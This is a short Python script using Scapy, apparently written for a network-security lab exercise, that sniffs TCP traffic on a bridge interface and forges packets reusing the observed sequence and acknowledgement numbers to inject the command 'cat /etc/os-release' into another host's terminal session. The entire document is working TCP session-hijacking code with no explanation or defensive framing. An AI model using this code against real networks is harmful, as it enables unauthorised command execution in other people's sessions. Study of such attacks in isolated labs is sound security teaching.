vic_ip = '10.9.0.5'

from scapy.all import *
def hijack_tcp(pkt):
    # ACK = 0x10
    if(pkt[IP].src != vic_ip and pkt[TCP].flags == 0x10):
        ip = IP(src = pkt[IP].src, dst = pkt[IP].dst)
        tcp = TCP(sport = pkt[TCP].sport, 
                  dport = pkt[TCP].dport, 
                  seq = pkt[TCP].seq,
                  ack = pkt[TCP].ack,
                  flags = 0x010)
        data = '\r cat /etc/os-release\r'              # \r: move the cursor back to the beginning of the line in terminal
        new_pkt = ip/tcp/data
        new_pkt.show()
        send(new_pkt)
        time.sleep(5)
        os.system('clear')

interf = 'br-d6b258aef2ee'
f = 'tcp'

pkt = sniff(iface=interf, filter=f, prn=hijack_tcp)